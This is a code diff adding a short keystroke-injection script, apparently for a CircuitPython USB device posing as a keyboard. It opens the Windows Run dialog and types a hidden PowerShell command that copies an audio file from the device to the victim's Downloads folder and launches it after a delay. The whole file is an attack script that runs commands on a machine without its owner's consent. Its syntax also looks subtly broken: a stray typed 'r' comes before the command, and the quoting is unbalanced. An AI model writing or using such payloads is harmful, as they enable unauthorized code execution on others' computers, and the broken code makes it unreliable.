@@ -1,0 +1,12 @@
+DELAY 5000
+VOLUME_UP
+VOLUME_UP
+GUI r
+STRING r
+DELAY 700
+STRING powershell -WindowStyle Hidden -Command "Copy-Item -Path ($((Get-Volume -FileSystemLabel 'CIRCUITPY').DriveLetter + ':\w.mp3')) -Destination ($env:USERPROFILE + '\Downloads\s.mp3');Start-Sleep 30;Start-Process "$env:USERPROFILE\Downloads\s.mp3""
+DELAY 100
+ENTER
+DELAY 100
+ESC
+DELAY 20000
